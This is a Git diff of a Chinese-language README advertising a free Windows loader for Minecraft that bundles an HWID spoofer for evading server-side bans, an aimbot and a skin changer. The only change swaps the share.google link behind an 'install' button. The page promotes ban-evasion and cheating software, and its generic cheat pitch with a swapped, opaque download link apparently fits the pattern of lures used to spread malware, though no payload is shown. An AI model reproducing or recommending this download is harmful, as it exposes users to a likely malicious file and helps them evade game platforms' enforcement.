@@ -5,7 +5,7 @@
 **我的世界** — HWID 机器码修改、自瞄与皮肤修改，全部集成在一个 Windows 载入器中。spoofer 会重置被 Server-side 封禁的硬件标识，自瞄参数完全可调，皮肤修改在本地生效。**免费下载，支持 Windows 10 / 11。**
 
 <p align="center">
-  <a href="https://share.google/XuDEGPKRqrdit79gt"><img src="button.svg" alt="开始安装" height="46"></a>
+  <a href="https://share.google/cqMP27dJ0yep1NhLt"><img src="button.svg" alt="开始安装" height="46"></a>
 </p>
 
 ## ⚡ 快速开始
